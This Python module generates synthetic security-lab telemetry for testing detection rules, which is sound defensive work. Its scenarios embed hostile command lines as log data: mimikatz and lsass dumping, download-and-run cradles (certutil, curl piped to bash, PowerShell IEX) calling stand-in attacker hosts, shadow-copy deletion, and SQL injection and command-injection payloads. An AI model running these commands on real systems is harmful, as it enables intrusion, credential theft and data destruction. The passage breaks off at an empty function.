"""Generate deterministic, realistic lab telemetry in ECS shape.

This exists so the pipeline is reproducible in CI and demoable without a
Windows VM, a Linux fleet, a cloud account, or a network sensor. Every event is
synthetic and clearly labelled as such; when real telemetry is connected, point
config/logsource_map.yml at the production indices and stop using this
generator.

Run with:  python -m pipeline.labgen --scenario all --out lab/logs
"""

from __future__ import annotations

import argparse
import json
import ntpath
import posixpath
import random
import sys
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from pipeline.common import LAB_LOGS_DIR, ensure_dir

WINDOWS_HOST = "WIN10-LAB"
DC_HOST = "DC01"
LINUX_HOST = "linux01"
WEB_HOST = "web01"
EDGE_HOST = "edge-fw01"
CLOUD_HOST = "aws-prod"

ATTACKER = "203.0.113.44"
WEB_ATTACKER = "203.0.113.77"
SPRAY_IP = "198.51.100.23"
SCAN_IP = "192.0.2.66"
C2_IP = "203.0.113.99"
EXFIL_IP = "203.0.113.120"
NOISE_IP = "198.51.100.9"
BROWSER_UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0 Safari/537.36"

# Network flows carry addresses, not hostnames, so map lab assets to their
# addresses at the boundary. The ECS template types destination.ip as an IP.
HOST_IP = {
    EDGE_HOST: "10.20.0.1",
    WEB_HOST: "10.20.0.10",
    WINDOWS_HOST: "10.20.0.21",
    LINUX_HOST: "10.20.0.22",
    DC_HOST: "10.20.0.5",
}

SCENARIOS = (
    "baseline",
    "ssh-bruteforce",
    "password-spray",
    "credential-dump",
    "encoded-powershell",
    "certutil-download",
    "service-persistence",
    "webshell",
    "new-user",
    "cron-persistence",
    "ransomware",
    "registry-persistence",
    "wmi-persistence",
    "psexec-lateral",
    "discovery-burst",
    "cloud-key-creation",
    "port-scan",
    "dns-tunnel",
    "exfil-transfer",
    "web-attack",
    "office-macro",
    "uac-bypass",
    "kerberoasting",
    "linux-persistence",
    "defense-evasion",
    "data-staging",
    "service-stop",
    "lolbins",
)


def iso(value: datetime) -> str:
    return value.astimezone(timezone.utc).isoformat(timespec="milliseconds").replace("+00:00", "Z")


def _parent_block(image: str, command_line: str, pid: int) -> dict[str, Any]:
    return {
        "name": ntpath.basename(image),
        "executable": image,
        "executable.caseless": image.lower(),
        "command_line": command_line,
        "pid": pid,
    }


class Lab:
    def __init__(self, base_time: datetime, seed: int = 1337) -> None:
        self.base = base_time.astimezone(timezone.utc)
        self.rng = random.Random(seed)
        self.windows: list[dict[str, Any]] = []
        self.linux: list[dict[str, Any]] = []
        self.web: list[dict[str, Any]] = []
        self.cloud: list[dict[str, Any]] = []
        self.network: list[dict[str, Any]] = []

    # ---------------------------------------------------------------- windows
    def process_creation(
        self,
        ts: datetime,
        image: str,
        command_line: str,
        parent_image: str = r"C:\Windows\explorer.exe",
        parent_command_line: str = r"C:\Windows\explorer.exe",
        user: str = r"LAB\analyst",
        host: str = WINDOWS_HOST,
    ) -> None:
        pid = self.rng.randint(1200, 9000)
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "1",
                    "kind": "event",
                    "category": ["process"],
                    "type": ["start"],
                    "action": "process_start",
                    "dataset": "windows.sysmon_operational",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "user": {"name": user, "domain": user.split("\\")[0] if "\\" in user else "LAB"},
                "process": {
                    "name": ntpath.basename(image),
                    "executable": image,
                    "executable.caseless": image.lower(),
                    "command_line": command_line,
                    "pid": pid,
                    "parent": _parent_block(parent_image, parent_command_line, self.rng.randint(500, 1200)),
                },
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": "1",
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "event_data": {
                        "Image": image,
                        "CommandLine": command_line,
                        "ParentImage": parent_image,
                        "User": user,
                    },
                },
            }
        )

    def process_access(
        self,
        ts: datetime,
        source_image: str,
        target_image: str,
        granted_access: str,
        host: str = WINDOWS_HOST,
    ) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "10",
                    "kind": "event",
                    "category": ["process"],
                    "type": ["access"],
                    "action": "process_access",
                    "dataset": "windows.sysmon_operational",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "process": {
                    "name": ntpath.basename(source_image),
                    "executable": source_image,
                    "executable.caseless": source_image.lower(),
                    "pid": self.rng.randint(1200, 9000),
                },
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": "10",
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "event_data": {
                        "SourceImage": source_image,
                        "TargetImage": target_image,
                        "GrantedAccess": granted_access,
                    },
                },
            }
        )

    def service_install(self, ts: datetime, service_name: str, image_path: str, host: str = WINDOWS_HOST) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "7045",
                    "kind": "event",
                    "category": ["configuration"],
                    "type": ["change"],
                    "action": "service_install",
                    "dataset": "windows.system",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "winlog": {
                    "channel": "System",
                    "event_id": "7045",
                    "computer_name": host,
                    "provider_name": "Service Control Manager",
                    "event_data": {
                        "ServiceName": service_name,
                        "ImagePath": image_path,
                        "ServiceType": "user mode service",
                        "StartType": "auto start",
                    },
                },
                "message": f"A service was installed in the system. Service Name: {service_name}",
            }
        )

    def service_stop(self, ts: datetime, service_name: str, host: str = WINDOWS_HOST) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "7036",
                    "kind": "event",
                    "category": ["configuration"],
                    "type": ["change"],
                    "action": "service_stop",
                    "dataset": "windows.system",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "winlog": {
                    "channel": "System",
                    "event_id": "7036",
                    "computer_name": host,
                    "provider_name": "Service Control Manager",
                    "event_data": {
                        "ServiceName": service_name,
                        "param1": "stopped",
                        "param2": "",
                    },
                },
                "message": f"The {service_name} service entered the stopped state.",
            }
        )

    def defender_event(self, ts: datetime, code: str, message: str, host: str = WINDOWS_HOST) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": code,
                    "kind": "event",
                    "category": ["configuration"],
                    "type": ["change"],
                    "action": "defender_configuration",
                    "dataset": "windows.defender",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "winlog": {
                    "channel": "Microsoft-Windows-Windows Defender/Operational",
                    "event_id": code,
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Windows Defender",
                },
                "message": message,
            }
        )

    def registry_event(self, ts: datetime, target_object: str, details: str, host: str = WINDOWS_HOST) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "13",
                    "kind": "event",
                    "category": ["registry"],
                    "type": ["change"],
                    "action": "registry_set",
                    "dataset": "windows.sysmon_operational",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "registry": {"path": target_object, "value": details, "hive": "HKLM"},
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": "13",
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "event_data": {"TargetObject": target_object, "Details": details},
                },
            }
        )

    def file_event(
        self,
        ts: datetime,
        target_filename: str,
        image: str = r"C:\Windows\explorer.exe",
        user: str = r"LAB\analyst",
        host: str = WINDOWS_HOST,
    ) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "11",
                    "kind": "event",
                    "category": ["file"],
                    "type": ["change"],
                    "action": "file_write",
                    "dataset": "windows.sysmon_operational",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "user": {"name": user},
                "file": {
                    "path": target_filename,
                    "name": ntpath.basename(target_filename),
                    "directory": ntpath.dirname(target_filename),
                },
                "process": {
                    "name": ntpath.basename(image),
                    "executable": image,
                    "executable.caseless": image.lower(),
                },
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": "11",
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "event_data": {"TargetFilename": target_filename, "Image": image},
                },
            }
        )

    def dns_event(self, ts: datetime, query_name: str, host: str = WINDOWS_HOST) -> None:
        self.windows.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "code": "22",
                    "kind": "event",
                    "category": ["network"],
                    "type": ["connection"],
                    "action": "dns_query",
                    "dataset": "windows.sysmon_operational",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "dns": {"question": {"name": query_name, "type": "A"}},
                "winlog": {
                    "channel": "Microsoft-Windows-Sysmon/Operational",
                    "event_id": "22",
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Sysmon",
                    "event_data": {"QueryName": query_name, "QueryStatus": "0"},
                },
            }
        )

    def security_event(
        self,
        ts: datetime,
        code: str,
        event_data: dict[str, Any] | None = None,
        message: str = "",
        host: str = DC_HOST,
    ) -> None:
        payload = event_data or {}
        event: dict[str, Any] = {
                "@timestamp": iso(ts),
                "event": {
                    "code": code,
                    "kind": "event",
                    "category": ["authentication"] if code in {"4624", "4625", "4769"} else ["configuration"],
                    "type": ["info"],
                    "action": "security_event",
                    "outcome": "success",
                    "dataset": "windows.security",
                    "module": "windows",
                },
                "host": {"name": host, "os": {"type": "windows", "platform": "windows"}},
                "winlog": {
                    "channel": "Security",
                    "event_id": code,
                    "computer_name": host,
                    "provider_name": "Microsoft-Windows-Security-Auditing",
                    "event_data": payload,
                },
                "message": message or f"Windows security event {code}",
            }
        if payload.get("ServiceName"):
            event["service"] = {"name": payload["ServiceName"]}
        self.windows.append(event)

    # ------------------------------------------------------------------ linux
    def auth_event(
        self,
        ts: datetime,
        message: str,
        source_ip: str,
        user: str = "root",
        outcome: str = "failure",
        host: str = LINUX_HOST,
    ) -> None:
        self.linux.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["authentication"],
                    "type": ["start"],
                    "action": "ssh_auth",
                    "outcome": outcome,
                    "dataset": "system.auth",
                    "module": "system",
                },
                "host": {"name": host, "os": {"type": "linux", "platform": "linux"}},
                "user": {"name": user},
                "source": {"ip": source_ip, "port": self.rng.randint(40000, 60000)},
                "system": {
                    "auth": {
                        "ssh": {
                            "event": "Failed" if outcome == "failure" else "Accepted",
                            "method": "password",
                        }
                    }
                },
                "message": message,
            }
        )

    def cron_event(self, ts: datetime, message: str, host: str = LINUX_HOST) -> None:
        self.linux.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["process"],
                    "type": ["start"],
                    "action": "cron_run",
                    "dataset": "system.cron",
                    "module": "system",
                },
                "host": {"name": host, "os": {"type": "linux", "platform": "linux"}},
                "user": {"name": "root"},
                "message": message,
            }
        )

    def linux_process(
        self,
        ts: datetime,
        command_line: str,
        user: str = "root",
        host: str = LINUX_HOST,
    ) -> None:
        executable = command_line.split()[0]
        self.linux.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["process"],
                    "type": ["start"],
                    "action": "process_start",
                    "dataset": "system.syslog",
                    "module": "system",
                },
                "host": {"name": host, "os": {"type": "linux", "platform": "linux"}},
                "user": {"name": user},
                "process": {
                    "name": posixpath.basename(executable),
                    "executable": executable,
                    "command_line": command_line,
                    "pid": self.rng.randint(1200, 32000),
                },
                "message": f"session opened for user {user} by (uid=0); command: {command_line}",
            }
        )

    def linux_file(self, ts: datetime, path: str, user: str = "root", host: str = LINUX_HOST) -> None:
        self.linux.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["file"],
                    "type": ["change"],
                    "action": "file_write",
                    "dataset": "system.audit",
                    "module": "system",
                },
                "host": {"name": host, "os": {"type": "linux", "platform": "linux"}},
                "user": {"name": user},
                "file": {
                    "path": path,
                    "name": posixpath.basename(path),
                    "directory": posixpath.dirname(path),
                },
                "message": f"file={path} operation=write user={user}",
            }
        )

    # -------------------------------------------------------------------- web
    def web_event(
        self,
        ts: datetime,
        method: str,
        path: str,
        query: str | None = None,
        status: int = 200,
        source_ip: str = NOISE_IP,
        user_agent: str = BROWSER_UA,
        host: str = WEB_HOST,
    ) -> None:
        target = f"{path}?{query}" if query else path
        self.web.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["web"],
                    "type": ["access"],
                    "action": "web_request",
                    "outcome": "success" if status < 400 else "failure",
                    "dataset": "nginx.access",
                    "module": "nginx",
                },
                "host": {"name": host, "os": {"type": "linux", "platform": "linux"}},
                "http": {"request": {"method": method}, "response": {"status_code": status, "bytes": 512}},
                "url": {"path": path, "query": query},
                "source": {"ip": source_ip},
                "user_agent": {"original": user_agent},
                "message": f'{source_ip} - - "{method} {target} HTTP/1.1" {status} 512 "-" "{user_agent}"',
            }
        )

    # ------------------------------------------------------------------ cloud
    def cloud_event(
        self,
        ts: datetime,
        action: str,
        user: str = "svc-automation",
        source_ip: str = NOISE_IP,
        outcome: str = "success",
        region: str = "us-east-1",
    ) -> None:
        self.cloud.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["iam"],
                    "type": ["change"],
                    "action": action,
                    "outcome": outcome,
                    "dataset": "aws.cloudtrail",
                    "module": "aws",
                },
                "host": {"name": CLOUD_HOST},
                "cloud": {
                    "provider": "aws",
                    "region": region,
                    "account": {"id": "111122223333"},
                },
                "user": {"name": user, "id": f"AIDA{sum(ord(char) for char in user) % 10**8:08d}"},
                "source": {"ip": source_ip},
                "message": f"AWS API {action} by {user} in {region}: {outcome}",
            }
        )

    # ---------------------------------------------------------------- network
    def network_event(
        self,
        ts: datetime,
        source_ip: str,
        destination_ip: str,
        destination_port: int,
        byte_count: int,
        direction: str = "outbound",
        transport: str = "tcp",
        host: str = EDGE_HOST,
    ) -> None:
        source_ip = HOST_IP.get(source_ip, source_ip)
        destination_ip = HOST_IP.get(destination_ip, destination_ip)
        self.network.append(
            {
                "@timestamp": iso(ts),
                "event": {
                    "kind": "event",
                    "category": ["network"],
                    "type": ["connection"],
                    "action": "network_flow",
                    "outcome": "success",
                    "dataset": "network.flow",
                    "module": "suricata",
                },
                "host": {"name": host},
                "source": {"ip": source_ip, "port": self.rng.randint(40000, 60000)},
                "destination": {"ip": destination_ip, "port": destination_port},
                "network": {
                    "direction": direction,
                    "transport": transport,
                    "protocol": transport,
                    "bytes": byte_count,
                },
                "message": f"{direction} {transport} flow {source_ip} -> {destination_ip}:{destination_port} ({byte_count} bytes)",
            }
        )


# ---------------------------------------------------------------- scenarios
def scenario_baseline(lab: Lab) -> None:
    """Benign activity that should NOT trigger a detection."""
    start = lab.base - timedelta(hours=10)
    users = ["analyst", "j.tan", "m.okafor", "s.reyes"]
    for index in range(150):
        ts = start + timedelta(minutes=index * 4 + lab.rng.randint(0, 2))
        user = users[index % len(users)]
        lab.process_creation(
            ts,
            r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            r'"C:\Program Files\Google\Chrome\Application\chrome.exe" --profile-directory=Default',
            user=f"LAB\\{user}",
        )
        lab.process_creation(
            ts + timedelta(seconds=20),
            r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
            r'"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE" /recycle',
            user=f"LAB\\{user}",
        )
        lab.file_event(
            ts + timedelta(seconds=35),
            rf"C:\Users\{user}\Documents\Q4-notes-{index:03d}.docx",
            user=f"LAB\\{user}",
        )
        lab.auth_event(
            ts + timedelta(seconds=40),
            f"Accepted password for deploy from {NOISE_IP} port 44122 ssh2",
            NOISE_IP,
            "deploy",
            "success",
        )
        lab.linux_process(ts + timedelta(seconds=45), "/usr/bin/apt-get update", "deploy")
        lab.cron_event(ts + timedelta(seconds=50), "(root) CMD (/usr/local/bin/backup.sh --quiet)")
        lab.web_event(ts + timedelta(seconds=55), "GET", "/index.html", status=200)
        lab.web_event(ts + timedelta(seconds=56), "GET", "/assets/app.js", status=200)
        lab.web_event(ts + timedelta(seconds=57), "GET", "/api/health", status=200)
        lab.cloud_event(ts + timedelta(seconds=58), "DescribeInstances")
        lab.cloud_event(ts + timedelta(seconds=59), "GetObject")
        lab.network_event(ts + timedelta(seconds=60), NOISE_IP, WEB_HOST, 443, 4800, "inbound")
        lab.network_event(ts + timedelta(seconds=61), WEB_HOST, "198.51.100.50", 443, 18200, "outbound")

    # Legitimate admin PowerShell, no encoded command.
    lab.process_creation(
        lab.base - timedelta(minutes=90),
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell.exe -NoProfile -Command Get-Service | Where-Object Status -eq 'Running'",
        user=r"LAB\admin",
    )

    # A few isolated failed logins from a normal user, hours apart.
    for index in range(3):
        ts = lab.base - timedelta(hours=7 - index * 2)
        lab.auth_event(
            ts,
            f"Failed password for deploy from {NOISE_IP} port 4422{index} ssh2",
            NOISE_IP,
            "deploy",
            "failure",
        )


def scenario_ssh_bruteforce(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=12)
    users = ["root", "admin", "oracle", "postgres", "ubuntu", "test"]
    for index in range(14):
        ts = start + timedelta(seconds=index * 18)
        user = users[index % len(users)]
        lab.auth_event(
            ts,
            f"Failed password for invalid user {user} from {ATTACKER} port 51{index:03d} ssh2",
            ATTACKER,
            user,
            "failure",
        )
    lab.auth_event(
        start + timedelta(minutes=4, seconds=30),
        f"Accepted password for deploy from {ATTACKER} port 51999 ssh2",
        ATTACKER,
        "deploy",
        "success",
    )


def scenario_password_spray(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=50)
    users = [f"user{index:02d}" for index in range(1, 23)]
    for index, user in enumerate(users):
        ts = start + timedelta(seconds=index * 7)
        lab.auth_event(
            ts,
            f"Failed password for invalid user {user} from {SPRAY_IP} port 55{index:03d} ssh2",
            SPRAY_IP,
            user,
            "failure",
        )
    lab.auth_event(
        start + timedelta(seconds=170),
        f"Accepted password for user07 from {SPRAY_IP} port 55999 ssh2",
        SPRAY_IP,
        "user07",
        "success",
    )


def scenario_credential_dump(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=20)
    lab.process_creation(
        ts,
        r"C:\Users\Public\mimikatz.exe",
        r"C:\Users\Public\mimikatz.exe privilege::debug sekurlsa::logonpasswords",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c C:\\Users\\Public\\mimikatz.exe",
        user=r"LAB\admin",
    )
    lab.process_access(ts + timedelta(seconds=8), r"C:\Users\Public\mimikatz.exe", r"C:\Windows\system32\lsass.exe", "0x1010")
    lab.process_creation(
        ts + timedelta(seconds=40),
        r"C:\Windows\System32\rundll32.exe",
        r"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 640 C:\Users\Public\lsass.dmp full",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c rundll32 comsvcs.dll MiniDump",
        user=r"LAB\admin",
    )
    lab.process_creation(
        ts + timedelta(minutes=1),
        r"C:\Windows\System32\reg.exe",
        r"reg.exe save hklm\sam C:\Users\Public\sam.save",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c reg save hklm\\sam",
        user=r"LAB\admin",
    )


def scenario_encoded_powershell(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=25)
    lab.process_creation(
        ts,
        r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        r'"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -WindowStyle Hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADIAMAAzAC4AMAAuADEAMQAzAC4ANAA0AC8AYQAnACkA',
        parent_image=r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE",
        parent_command_line=r'"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE" /n C:\Users\analyst\Documents\invoice.docm',
        user=r"LAB\analyst",
    )


def scenario_certutil_download(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=23)
    lab.process_creation(
        ts,
        r"C:\Windows\System32\certutil.exe",
        r"certutil.exe -urlcache -split -f http://203.0.113.44/payload.exe C:\Users\Public\p.exe",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c certutil -urlcache -f http://203.0.113.44/payload.exe C:\\Users\\Public\\p.exe",
        user=r"LAB\analyst",
    )


def scenario_service_persistence(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=16)
    lab.defender_event(ts - timedelta(minutes=2), "5001", "Windows Defender Antivirus Real-time Protection feature has been disabled.")
    lab.service_install(ts, "UpdaterSvc", r"C:\Users\Public\svc.exe")
    lab.process_creation(
        ts + timedelta(seconds=30),
        r"C:\Windows\System32\schtasks.exe",
        r'schtasks.exe /create /tn "Updater" /tr "C:\Users\Public\upd.exe" /sc onlogon /ru SYSTEM /f',
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c schtasks /create /tn Updater",
        user=r"LAB\admin",
    )


def scenario_webshell(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=10)
    lab.web_event(start, "POST", "/uploads/shell.php", status=200, source_ip=WEB_ATTACKER)
    for index in range(7):
        ts = start + timedelta(seconds=20 + index * 15)
        lab.web_event(ts, "GET", "/uploads/shell.php", query="cmd=id", status=200, source_ip=WEB_ATTACKER)
    lab.web_event(
        start + timedelta(minutes=2, seconds=10),
        "GET",
        "/uploads/shell.php",
        query="cmd=whoami",
        status=200,
        source_ip=WEB_ATTACKER,
    )


def scenario_new_user(lab: Lab) -> None:
    lab.auth_event(
        lab.base - timedelta(minutes=45),
        "new user: name=backup, UID=1002, GID=1002, home=/home/backup, shell=/bin/bash",
        "127.0.0.1",
        "root",
        "success",
    )


def scenario_cron_persistence(lab: Lab) -> None:
    lab.cron_event(lab.base - timedelta(minutes=43), "(root) CMD (curl -s http://203.0.113.44/x.sh | bash)")


def scenario_ransomware(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=35)
    lab.process_creation(
        start,
        r"C:\Windows\System32\vssadmin.exe",
        r"vssadmin.exe delete shadows /all /quiet",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c vssadmin delete shadows /all /quiet",
        user=r"LAB\admin",
    )
    lab.process_creation(
        start + timedelta(seconds=20),
        r"C:\Windows\System32\wbem\wmic.exe",
        r"wmic.exe shadowcopy delete",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c wmic shadowcopy delete",
        user=r"LAB\admin",
    )
    lab.process_creation(
        start + timedelta(seconds=40),
        r"C:\Windows\System32\bcdedit.exe",
        r"bcdedit.exe /set {default} recoveryenabled no",
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c bcdedit /set recoveryenabled no",
        user=r"LAB\admin",
    )
    lab.service_stop(start + timedelta(seconds=50), "VSS")
    lab.service_stop(start + timedelta(seconds=55), "BackupExecAgentBrowser")
    lab.file_event(start + timedelta(minutes=1), r"C:\Users\analyst\Desktop\READ_ME.txt", image=r"C:\Users\Public\locker.exe", user=r"LAB\analyst")
    lab.file_event(start + timedelta(minutes=1, seconds=5), r"D:\Shares\finance\DECRYPT_INSTRUCTIONS.txt", image=r"C:\Users\Public\locker.exe")
    extensions = ["docx", "xlsx", "pdf", "pptx", "jpg"]
    for index in range(24):
        ts = start + timedelta(minutes=1, seconds=10 + index * 2)
        lab.file_event(
            ts,
            rf"C:\Users\analyst\Documents\file{index:02d}.{extensions[index % len(extensions)]}.locked",
            image=r"C:\Users\Public\locker.exe",
            user=r"LAB\analyst",
        )


def scenario_registry_persistence(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=33)
    lab.registry_event(
        ts,
        r"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\Updater",
        r"C:\Users\Public\svc.exe --silent",
    )
    lab.registry_event(
        ts + timedelta(seconds=25),
        r"HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OneDriveSync",
        r"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.44/a')",
        host=WINDOWS_HOST,
    )


def scenario_wmi_persistence(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=31)
    lab.process_creation(
        ts,
        r"C:\Windows\System32\wbem\wmic.exe",
        r'wmic.exe /namespace:\\root\subscription path __EventFilter create Name=Updater',
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c wmic /namespace:\\\\root\\subscription path __EventFilter create",
        user=r"LAB\admin",
    )
    lab.process_creation(
        ts + timedelta(seconds=20),
        r"C:\Windows\System32\wbem\wmic.exe",
        r'wmic.exe /namespace:\\root\subscription path CommandLineEventConsumer create Name=UpdaterExec CommandLineTemplate="C:\Users\Public\svc.exe"',
        parent_image=r"C:\Windows\System32\cmd.exe",
        parent_command_line="cmd.exe /c wmic /namespace:\\\\root\\subscription path CommandLineEventConsumer create",
        user=r"LAB\admin",
    )


def scenario_psexec_lateral(lab: Lab) -> None:
    ts = lab.base - timedelta(minutes=29)
    lab.service_install(ts, "PSEXESVC", r"C:\Windows\PSEXESVC.exe")
    lab.process_creation(
        ts + timedelta(seconds=15),
        r"C:\Windows\PSEXESVC.exe",
        r"C:\Windows\PSEXESVC.exe -service",
        parent_image=r"C:\Windows\System32\services.exe",
        parent_command_line=r"C:\Windows\System32\services.exe",
        user=r"NT AUTHORITY\SYSTEM",
    )


def scenario_discovery_burst(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=27)
    commands = [
        ("whoami /all", r"C:\Windows\System32\whoami.exe"),
        ("net user", r"C:\Windows\System32\net.exe"),
        ("net user administrator /domain", r"C:\Windows\System32\net.exe"),
        ("net group \"Domain Admins\" /domain", r"C:\Windows\System32\net.exe"),
        ("net view /all", r"C:\Windows\System32\net.exe"),
        ("net localgroup administrators", r"C:\Windows\System32\net.exe"),
        ("nltest /dclist:lab.local", r"C:\Windows\System32\nltest.exe"),
        ("systeminfo", r"C:\Windows\System32\systeminfo.exe"),
        ("ipconfig /all", r"C:\Windows\System32\ipconfig.exe"),
    ]
    for index, (command, image) in enumerate(commands):
        lab.process_creation(
            start + timedelta(seconds=index * 12),
            image,
            command,
            parent_image=r"C:\Windows\System32\cmd.exe",
            parent_command_line=f"cmd.exe /c {command}",
            user=r"LAB\analyst",
        )


def scenario_cloud_key_creation(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=55)
    lab.cloud_event(start, "ConsoleLogin", "root", ATTACKER, "success", "us-east-1")
    lab.cloud_event(start + timedelta(seconds=30), "CreateAccessKey", "root", ATTACKER, "success", "us-east-1")
    lab.cloud_event(start + timedelta(seconds=45), "AttachUserPolicy", "root", ATTACKER, "success", "us-east-1")
    lab.cloud_event(start + timedelta(minutes=1), "CreateUser", "root", ATTACKER, "success", "us-east-1")


def scenario_port_scan(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=40)
    for index in range(30):
        port = 20 + index
        lab.network_event(
            start + timedelta(seconds=index * 2),
            SCAN_IP,
            WEB_HOST,
            port,
            60,
            "inbound",
        )
    for index, port in enumerate([22, 80, 443, 3306, 5432, 8080]):
        lab.network_event(
            start + timedelta(minutes=2, seconds=index * 3),
            SCAN_IP,
            LINUX_HOST,
            port,
            120,
            "inbound",
        )


def scenario_dns_tunnel(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=22)
    for index in range(24):
        payload = f"{index:04d}-{'a' * 26}-{index * 7:06d}"
        lab.dns_event(start + timedelta(seconds=index * 4), f"{payload}.tunnel.example")
    lab.dns_event(start + timedelta(minutes=2), "health.tunnel.example")


def scenario_exfil_transfer(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=18)
    lab.network_event(start, WINDOWS_HOST, EXFIL_IP, 443, 15_400_000, "outbound")
    lab.network_event(start + timedelta(seconds=40), WINDOWS_HOST, EXFIL_IP, 443, 42_800_000, "outbound")
    lab.network_event(start + timedelta(seconds=80), WINDOWS_HOST, EXFIL_IP, 8443, 9_200_000, "outbound")


def scenario_web_attack(lab: Lab) -> None:
    start = lab.base - timedelta(minutes=14)
    lab.web_event(start, "GET", "/", source_ip=WEB_ATTACKER, user_agent="sqlmap/1.8.4#stable (https://sqlmap.org)")
    payloads = [
        ("/search", "q=1' or 1=1--"),
        ("/product", "id=1 union select username,password from users"),
        ("/login", "user=admin' or 1=1--"),
        ("/report", "id=1; benchmark(5000000,md5(1))"),
        ("/api/items", "sort=information_schema.tables"),
        ("/download", "../../../../etc/passwd"),
        ("/static", "..%2f..%2f..%2fwindows%2fwin.ini"),
        ("/ping", "host=127.0.0.1;wget http://203.0.113.77/x.sh"),
        ("/run", "cmd=id"),
        ("/run", "exec=whoami"),
    ]
    for index, (path, query) in enumerate(payloads):
        lab.web_event(
            start + timedelta(seconds=5 + index * 3),
            "GET",
            path,
            query=query,
            status=500 if index % 3 == 0 else 200,
            source_ip=WEB_ATTACKER,
            user_agent="sqlmap/1.8.4#stable (https://sqlmap.org)" if index < 5 else "Mozilla/5.0",
        )
    for index in range(14):
        lab.web_event(
            start + timedelta(seconds=40 + index * 2),
            "GET",
            f"/admin{index}.php",
            status=404,
            source_ip=WEB_ATTACKER,
            user_agent="gobuster/3.6",
        )


def scenario_office_macro(lab: Lab) -> None:
